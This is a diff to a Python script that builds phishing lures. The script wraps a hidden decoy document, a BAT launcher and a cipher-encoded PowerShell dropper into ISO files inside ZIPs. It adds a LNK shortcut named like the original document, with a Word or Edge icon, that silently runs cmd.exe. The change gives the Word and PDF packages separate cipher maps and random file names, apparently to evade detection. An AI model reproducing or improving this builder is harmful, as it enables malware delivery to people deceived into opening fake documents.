@@ -613,40 +613,34 @@ def process_variant(variant_dir, output_dir):
             rehash_docx(dst)
             print(f'      ~ {f} (hash updated)')
 
-        # ── Step 2: Generate PS1 dropper (shared by both packages) ──
-        print('  [*] Step 2: Generate PS1 dropper...')
-        enc_map, dec_map = generate_cipher_map()
-        ps1_content = generate_ps1(enc_map, dec_map)
-        print(f'      Cipher map: {len(enc_map)} chars')
+        # ── Step 2: Build Word package (own cipher + names) ──
+        print('  [*] Step 2: Build Word package...')
+        w_bat = random_short_name() + '.bat'
+        w_ps1 = random_short_name() + '.ps1'
+        w_decoy = random_short_name() + '.docx'
+        w_enc, w_dec = generate_cipher_map()
+        w_ps1_content = generate_ps1(w_enc, w_dec)
+        print(f'      [word] bat={w_bat}, ps1={w_ps1}, decoy={w_decoy}')
 
-        # Random filenames for BAT / PS1 / decoy (unique per variant)
-        bat_name = random_short_name() + '.bat'
-        ps1_name = random_short_name() + '.ps1'
-        decoy_docx = random_short_name() + '.docx'
-        decoy_pdf = random_short_name() + '.pdf'
-        print(f'      Files: bat={bat_name}, ps1={ps1_name}, decoy={decoy_docx}/{decoy_pdf}')
-
-        # ── Step 3: Build Word package ──
-        print('  [*] Step 3: Build Word package...')
         word_pkg_dir = os.path.join(tmpdir, '_word_pkg')
         os.makedirs(word_pkg_dir)
 
         # Rename first DOCX -> random decoy name (hidden)
-        shutil.copy2(os.path.join(tmpdir, first_docx), os.path.join(word_pkg_dir, decoy_docx))
+        shutil.copy2(os.path.join(tmpdir, first_docx), os.path.join(word_pkg_dir, w_decoy))
         # Copy other DOCX files as-is (visible)
         for f in other_docx:
             shutil.copy2(os.path.join(tmpdir, f), os.path.join(word_pkg_dir, f))
 
         # Generate BAT
-        bat_content = generate_bat(decoy_docx, ps1_name)
-        bat_path = os.path.join(word_pkg_dir, bat_name)
+        bat_content = generate_bat(w_decoy, w_ps1)
+        bat_path = os.path.join(word_pkg_dir, w_bat)
         with open(bat_path, 'w', encoding='utf-8') as f:
             f.write(bat_content)
 
         # Write PS1
-        ps1_path = os.path.join(word_pkg_dir, ps1_name)
+        ps1_path = os.path.join(word_pkg_dir, w_ps1)
         with open(ps1_path, 'w', encoding='utf-8') as f:
-            f.write(ps1_content)
+            f.write(w_ps1_content)
 
         # Create LNK (Word icon)
         lnk_name = os.path.splitext(first_docx)[0] + '.lnk'
@@ -654,7 +648,7 @@ def process_variant(variant_dir, output_dir):
         create_lnk(
             out_path=lnk_path,
             target='C:\\Windows\\System32\\cmd.exe',
-            arguments=f'/c "start /min .\\{bat_name}"',
+            arguments=f'/c "start /min .\\{w_bat}"',
             icon_location='%SystemRoot%\\System32\\SHELL32.dll',
             icon_index=1,
             working_dir='.',
@@ -664,10 +658,10 @@ def process_variant(variant_dir, output_dir):
 
         # Build ISO
         iso_files = []
-        hidden_set = {bat_name, ps1_name, decoy_docx}
-        iso_files.append((bat_name, bat_path))
-        iso_files.append((ps1_name, ps1_path))
-        iso_files.append((decoy_docx, os.path.join(word_pkg_dir, decoy_docx)))
+        hidden_set = {w_bat, w_ps1, w_decoy}
+        iso_files.append((w_bat, bat_path))
+        iso_files.append((w_ps1, ps1_path))
+        iso_files.append((w_decoy, os.path.join(word_pkg_dir, w_decoy)))
         iso_files.append((lnk_name, lnk_path))
         for f in other_docx:
             iso_files.append((f, os.path.join(word_pkg_dir, f)))
@@ -682,8 +676,15 @@ def process_variant(variant_dir, output_dir):
             zf.write(word_iso_path, f'{variant_name}.iso')
         print(f'      ZIP: {word_zip_path}')
 
-        # ── Step 4: Build PDF package ──
-        print('  [*] Step 4: Build PDF package...')
+        # ── Step 3: Build PDF package (own cipher + names) ──
+        print('  [*] Step 3: Build PDF package...')
+        p_bat = random_short_name() + '.bat'
+        p_ps1 = random_short_name() + '.ps1'
+        p_decoy = random_short_name() + '.pdf'
+        p_enc, p_dec = generate_cipher_map()
+        p_ps1_content = generate_ps1(p_enc, p_dec)
+        print(f'      [pdf]  bat={p_bat}, ps1={p_ps1}, decoy={p_decoy}')
+
         pdf_pkg_dir = os.path.join(tmpdir, '_pdf_pkg')
         os.makedirs(pdf_pkg_dir)
 
@@ -702,21 +703,21 @@ def process_variant(variant_dir, output_dir):
         other_pdfs = [pdf_map[f] for f in other_docx]
 
         # Rename first PDF -> random decoy name (hidden)
-        shutil.copy2(os.path.join(pdf_convert_dir, first_pdf), os.path.join(pdf_pkg_dir, decoy_pdf))
+        shutil.copy2(os.path.join(pdf_convert_dir, first_pdf), os.path.join(pdf_pkg_dir, p_decoy))
         # Copy other PDFs as-is (visible)
         for f in other_pdfs:
             shutil.copy2(os.path.join(pdf_convert_dir, f), os.path.join(pdf_pkg_dir, f))
 
-        # Generate BAT (opens decoy pdf) — same random bat/ps1 names
-        bat_content_pdf = generate_bat(decoy_pdf, ps1_name)
-        bat_path_pdf = os.path.join(pdf_pkg_dir, bat_name)
+        # Generate BAT (opens decoy pdf)
+        bat_content_pdf = generate_bat(p_decoy, p_ps1)
+        bat_path_pdf = os.path.join(pdf_pkg_dir, p_bat)
         with open(bat_path_pdf, 'w', encoding='utf-8') as f:
             f.write(bat_content_pdf)
 
-        # Write PS1 (same dropper)
-        ps1_path_pdf = os.path.join(pdf_pkg_dir, ps1_name)
+        # Write PS1 (own dropper)
+        ps1_path_pdf = os.path.join(pdf_pkg_dir, p_ps1)
         with open(ps1_path_pdf, 'w', encoding='utf-8') as f:
-            f.write(ps1_content)
+            f.write(p_ps1_content)
 
         # Create LNK (Edge icon)
         lnk_name_pdf = os.path.splitext(first_docx)[0] + '.lnk'
@@ -724,7 +725,7 @@ def process_variant(variant_dir, output_dir):
         create_lnk(
             out_path=lnk_path_pdf,
             target='C:\\Windows\\System32\\cmd.exe',
-            arguments=f'/c "start /min .\\{bat_name}"',
+            arguments=f'/c "start /min .\\{p_bat}"',
             icon_location='%ProgramFiles(x86)%\\Microsoft\\Edge\\Application\\msedge.exe',
             icon_index=11,
             working_dir='.',
@@ -734,10 +735,10 @@ def process_variant(variant_dir, output_dir):
 
         # Build ISO
         pdf_iso_files = []
-        pdf_hidden_set = {bat_name, ps1_name, decoy_pdf}
-        pdf_iso_files.append((bat_name, bat_path_pdf))
-        pdf_iso_files.append((ps1_name, ps1_path_pdf))
-        pdf_iso_files.append((decoy_pdf, os.path.join(pdf_pkg_dir, decoy_pdf)))
+        pdf_hidden_set = {p_bat, p_ps1, p_decoy}
+        pdf_iso_files.append((p_bat, bat_path_pdf))
+        pdf_iso_files.append((p_ps1, ps1_path_pdf))
+        pdf_iso_files.append((p_decoy, os.path.join(pdf_pkg_dir, p_decoy)))
         pdf_iso_files.append((lnk_name_pdf, lnk_path_pdf))
         for f in other_pdfs:
             pdf_iso_files.append((f, os.path.join(pdf_pkg_dir, f)))
